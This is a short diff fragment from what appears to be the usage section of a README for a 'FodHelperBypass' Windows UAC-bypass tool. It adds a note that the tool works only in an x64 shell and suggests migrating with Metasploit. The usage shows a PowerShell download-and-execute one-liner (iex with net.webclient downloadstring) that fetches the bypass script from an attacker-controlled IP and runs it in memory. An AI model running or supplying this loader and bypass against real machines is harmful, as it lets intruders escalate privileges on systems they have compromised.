@@ -3,6 +3,8 @@ FodHelperBypass (Bypass UAC)
 
 ## Usage
 ```
+ONLY WORKS FOR x64 SHELL !! (migrate using metasploit if needed)
+
 # Load FodHelper into memory
 iex (new-object net.webclient).downloadstring('http://192.168.45.218/FodhelperBypass.ps1')
 
